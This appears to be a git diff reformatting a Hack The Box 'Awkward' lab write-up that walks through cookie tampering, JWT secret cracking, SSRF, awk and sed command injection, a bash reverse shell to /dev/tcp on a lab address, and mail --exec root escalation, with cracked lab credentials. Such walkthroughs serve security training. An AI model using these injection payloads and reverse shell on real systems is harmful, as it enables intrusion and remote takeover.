@@ -6,8 +6,8 @@ date: 2022-10-29
 image: hackthebox-awkward-writeup.webp
 ---
 
-import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
-import { components as MDXComponents } from '../../components/mdxComponents';
+import FixTheImageURL from "../../components/mdxComponents/FixTheImageURL.astro";
+import { components as MDXComponents } from "../../components/mdxComponents";
 export const components = MDXComponents;
 
 ## Nmap
@@ -52,11 +52,11 @@ ff02::2 ip6-allrouters
 
 Simple `web page` nothing interesting there
 
-<FixTheImageURL src='web.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web.png" slug="hackthebox-awkward-writeup" />
 
 Checking the source code of the web page got the `app.js` file
 
-<FixTheImageURL src='web1.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web1.png" slug="hackthebox-awkward-writeup" />
 
 The code inside `app.js` file is too messy, so I use online beautifier
 
@@ -70,19 +70,19 @@ In the code found a `useful` link which goes to `/hr` page
 
 On the `/hr` page, it's required `creads` to login
 
-<FixTheImageURL src='web2.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web2.png" slug="hackthebox-awkward-writeup" />
 
 But if we see the `cookies` of the website, there is a token which is set to `guest`
 
-<FixTheImageURL src='web3.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web3.png" slug="hackthebox-awkward-writeup" />
 
 Let's change that to `admin`
 
-<FixTheImageURL src='web4.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web4.png" slug="hackthebox-awkward-writeup" />
 
 After refreshing the page, we are inside the `dashboard`
 
-<FixTheImageURL src='web5.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web5.png" slug="hackthebox-awkward-writeup" />
 
 But if you see there is a `section` for staff details which is empty and the status of the `store is down`
 
@@ -90,39 +90,39 @@ Let's check the `network` tab to find where they fetch this `details`
 
 And we found two `useful` links
 
--   /api/staff-details
--   /api/store-status
+- /api/staff-details
+- /api/store-status
 
-<FixTheImageURL src='web6.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web6.png" slug="hackthebox-awkward-writeup" />
 
 Going over to `/api/staff-details` we got the error called `jwt malformed`
 
-<FixTheImageURL src='web7.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web7.png" slug="hackthebox-awkward-writeup" />
 
 Let's delete the `cookie` and then see what `error` we got
 
-<FixTheImageURL src='web8.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web8.png" slug="hackthebox-awkward-writeup" />
 
 ## Information Disclosure
 
 After `removing` the cookie, we got the all `user` details as well as `password` for each user
 
-<FixTheImageURL src='web9.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web9.png" slug="hackthebox-awkward-writeup" />
 
 I use `crack station` to crack that hashes because it's look like it is `sha256` hash
 
 and one of the hash is `cracked`
 
-<FixTheImageURL src='web10.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web10.png" slug="hackthebox-awkward-writeup" />
 
--   Creads for Christopher - username: christopher.jones - password: chris123
-    I log in with these creads in `/hr` page
+- Creads for Christopher - username: christopher.jones - password: chris123
+  I log in with these creads in `/hr` page
 
-<FixTheImageURL src='web11.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web11.png" slug="hackthebox-awkward-writeup" />
 
 And got the `JWT` token, let's try to crack the JWT `secret`
 
-<FixTheImageURL src='web12.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web12.png" slug="hackthebox-awkward-writeup" />
 
 ## Cracking JWT Secret
 
@@ -166,14 +166,14 @@ Convert the token into `john` format
 
 And got the `secret` of the JWT
 
-<FixTheImageURL src='cmd.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="cmd.png" slug="hackthebox-awkward-writeup" />
 
--   Secret of JWT - 123beany123
-    I create the `JWT` token with the username which we found, but there is nothing on the `/dashboard` page
+- Secret of JWT - 123beany123
+  I create the `JWT` token with the username which we found, but there is nothing on the `/dashboard` page
 
 So let's move further with another `api` endpoint which we found `/api/store-status`
 
-<FixTheImageURL src='web13.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web13.png" slug="hackthebox-awkward-writeup" />
 
 ## Server-side request forgery (SSRF)
 
@@ -193,15 +193,15 @@ ffuf -w /opt/SecLists/Fuzzing/4-digits-0000-9999.txt -u 'http://hat-valley.htb/a
 
 And we got `3 ports` running internally, let's check them `one by one`
 
-<FixTheImageURL src='cmd1.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="cmd1.png" slug="hackthebox-awkward-writeup" />
 
 8080 port require `JavaScript` to run
 
-<FixTheImageURL src='web14.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web14.png" slug="hackthebox-awkward-writeup" />
 
 3002 port give us the all `API` endpoints routes as well as their `source code`
 
-<FixTheImageURL src='web15.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web15.png" slug="hackthebox-awkward-writeup" />
 
 ## Local File Inclusion (LFI)
 
@@ -210,78 +210,56 @@ Found an `endpoint` which is vulnerable to LFI
 The `AWK` command is `vulnerable`, now the box name make sense
 
 ```js
-app.get('/api/all-leave', (req, res) => {
-    const user_token = req.cookies.token;
+app.get("/api/all-leave", (req, res) => {
+  const user_token = req.cookies.token;
 
-    var authFailed = false;
+  var authFailed = false;
 
-    var user = null;
+  var user = null;
 
-    if (user_token) {
-        const decodedToken = jwt.verify(user_token, TOKEN_SECRET);
+  if (user_token) {
+    const decodedToken = jwt.verify(user_token, TOKEN_SECRET);
 
-        if (!decodedToken.username) {
-            authFailed = true;
-        } else {
-            user = decodedToken.username;
-        }
+    if (!decodedToken.username) {
+      authFailed = true;
+    } else {
+      user = decodedToken.username;
     }
+  }
 
-    if (authFailed) {
-        return res.status(401).json({ Error: 'Invalid Token' });
-    }
+  if (authFailed) {
+    return res.status(401).json({ Error: "Invalid Token" });
+  }
 
-    if (!user) {
-        return res.status(500).send('Invalid user');
-    }
+  if (!user) {
+    return res.status(500).send("Invalid user");
+  }
 
-    const bad = [
-        ';',
-        '&',
-        '|',
-        '>',
-        '<',
-        '*',
-        '?',
-        '`',
-        '$',
-        '(',
-        ')',
-        '{',
-        '}',
-        '[',
-        ']',
-        '!',
-        '#',
-    ];
+  const bad = [";", "&", "|", ">", "<", "*", "?", "`", "$", "(", ")", "{", "}", "[", "]", "!", "#"];
 
-    const badInUser = bad.some((char) => user.includes(char));
+  const badInUser = bad.some((char) => user.includes(char));
 
-    if (badInUser) {
-        return res.status(500).send('Bad character detected.');
-    }
+  if (badInUser) {
+    return res.status(500).send("Bad character detected.");
+  }
 
-    exec(
-        "awk '/" + user + "/' /var/www/private/leave_requests.csv",
-        { encoding: 'binary', maxBuffer: 51200000 },
-        (error, stdout, stderr) => {
-            if (stdout) {
-                return res.status(200).send(new Buffer(stdout, 'binary'));
-            }
+  exec(
+    "awk '/" + user + "/' /var/www/private/leave_requests.csv",
+    { encoding: "binary", maxBuffer: 51200000 },
+    (error, stdout, stderr) => {
+      if (stdout) {
+        return res.status(200).send(new Buffer(stdout, "binary"));
+      }
 
-            if (error) {
-                return res
-                    .status(500)
-                    .send('Failed to retrieve leave requests');
-            }
+      if (error) {
+        return res.status(500).send("Failed to retrieve leave requests");
+      }
 
-            if (stderr) {
-                return res
-                    .status(500)
-                    .send('Failed to retrieve leave requests');
-            }
-        }
-    );
+      if (stderr) {
+        return res.status(500).send("Failed to retrieve leave requests");
+      }
+    },
+  );
 });
 ```
 
@@ -304,17 +282,17 @@ exec("awk '//' /etc/passwd '/' /var/www/private/leave_requests.csv", {encoding: 
 
 And we can try this in our own `machine` as shown in the `picture`
 
-<FixTheImageURL src='cmd2.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="cmd2.png" slug="hackthebox-awkward-writeup" />
 
 Let's go to `jwt.io` and generate the custom `username` token
 
-<FixTheImageURL src='web16.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web16.png" slug="hackthebox-awkward-writeup" />
 
 And we got the `/etc/passwd` file
 
--   We got the 2 users
-    -   Bean
-    -   Christine
+- We got the 2 users
+  - Bean
+  - Christine
 
 ```js
 ❯ curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2NjcwMTcxNTd9.HKWzL6o9CamyDt0S-bxQyrKYEqQha_tDr1SfgSLcX7s" | grep -i /bin/bash
@@ -536,11 +514,11 @@ Save the output inside the `bean_backup_final.zip` file
 
 Extract that with `file manager`
 
-<FixTheImageURL src='cmd3.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="cmd3.png" slug="hackthebox-awkward-writeup" />
 
-<FixTheImageURL src='cmd4.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="cmd4.png" slug="hackthebox-awkward-writeup" />
 
-<FixTheImageURL src='cmd5.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="cmd5.png" slug="hackthebox-awkward-writeup" />
 
 And we got the home directory of `bean` user
 
@@ -594,9 +572,9 @@ https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html
 boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold⏎
 ```
 
--   Creads of bean user - username: bean - password: 014mrbeanrules!#P
-    Let's try to `ssh` in with that creads
-    <FixTheImageURL src='cmd6.png' slug='hackthebox-awkward-writeup' />
+- Creads of bean user - username: bean - password: 014mrbeanrules!#P
+  Let's try to `ssh` in with that creads
+  <FixTheImageURL src="cmd6.png" slug="hackthebox-awkward-writeup" />
 
 ## Privilege Escalation
 
@@ -619,7 +597,7 @@ Let's add that in our `/etc/hosts` file and check what's running on that
 
 But it's required `username` and `password`
 
-<FixTheImageURL src='web17.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web17.png" slug="hackthebox-awkward-writeup" />
 
 The website using `nginx` and the username and password `prompt` is coming from nginx because of `.htaccess` file which can usually be found inside `/etc/nginx/conf.d/` directory
 
@@ -630,13 +608,13 @@ admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
 
 > Got the Username, but the password is not crackable so let's reuse the bean password on the prompt
 
--   Creads
-    -   username: admin
-    -   password: 014mrbeanrules!#P
+- Creads
+  - username: admin
+  - password: 014mrbeanrules!#P
 
 And we `successfully` log in
 
-<FixTheImageURL src='web18.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web18.png" slug="hackthebox-awkward-writeup" />
 
 And also we have the `source code` of the website inside `/var/www/store`
 
@@ -667,8 +645,8 @@ Reading the `README.md` will tell us about
 
 1. They don't use any `database` till now
 2. They're using the files to store data inside these directories
-    - `/product-details` which store the details of the products
-    - `/cart` which store the user items
+   - `/product-details` which store the details of the products
+   - `/cart` which store the user items
 3. They `verify` their product with first header line which looks like `***Hat Valley Cart***`
 
 ```js
@@ -871,8 +849,8 @@ So we can use `-e` flag which is given in the help of `sed command`, this allows
 
 So let's talk about how to `abuse` that sed command
 
--   First our input look like this `' -e "1e /tmp/shell.sh" /tmp/shell.sh '`
--   Which will be replaced by `$item_id`
+- First our input look like this `' -e "1e /tmp/shell.sh" /tmp/shell.sh '`
+- Which will be replaced by `$item_id`
 
 ```js
 system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
@@ -896,7 +874,7 @@ bash -i >& /dev/tcp/10.10.XX.XX/9001 0>&1
 
 After that, add a `product` in the cart
 
-<FixTheImageURL src='web19.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web19.png" slug="hackthebox-awkward-writeup" />
 
 Checking that product in the `cart/` directory, where the file name is same as our `userId` which will generate randomly
 
@@ -930,7 +908,7 @@ Before deleting the cart item, check your `netcat` is listening
 
 Now click on delete and capture the `request` inside the `burp`
 
-<FixTheImageURL src='web20.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="web20.png" slug="hackthebox-awkward-writeup" />
 
 Change the `item parameter` like this
 
@@ -940,24 +918,24 @@ item=1'+-e+"1e+/tmp/shell.sh"+/tmp/shell.sh+'&user=c32c-8d49-752-e3d9&action=del
 
 Send the `request`
 
-<FixTheImageURL src='burp.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="burp.png" slug="hackthebox-awkward-writeup" />
 
 And we got the `shell` as `www-data`
 
-<FixTheImageURL src='cmd7.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="cmd7.png" slug="hackthebox-awkward-writeup" />
 
 Now let's run `pspy`
 
-<FixTheImageURL src='cmd8.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="cmd8.png" slug="hackthebox-awkward-writeup" />
 
 And we can see that `inotifywait` is monitoring a file called `leave_requests.csv` inside `/var/www/private/`
 
-<FixTheImageURL src='cmd9.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="cmd9.png" slug="hackthebox-awkward-writeup" />
 
 Let's add something in the file and see the `behavior`
 And we can see its using `mail` command with `root privilege`
 
-<FixTheImageURL src='cmd10.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="cmd10.png" slug="hackthebox-awkward-writeup" />
 
 Link : https://gtfobins.github.io/gtfobins/mail/
 
@@ -980,4 +958,4 @@ www-data@awkward:~/private$ echo '" --exec="\!/tmp/priv.sh"' >> leave_requests.c
 
 And boom 🎉 we got the `root.txt`
 
-<FixTheImageURL src='cmd11.png' slug='hackthebox-awkward-writeup' />
+<FixTheImageURL src="cmd11.png" slug="hackthebox-awkward-writeup" />
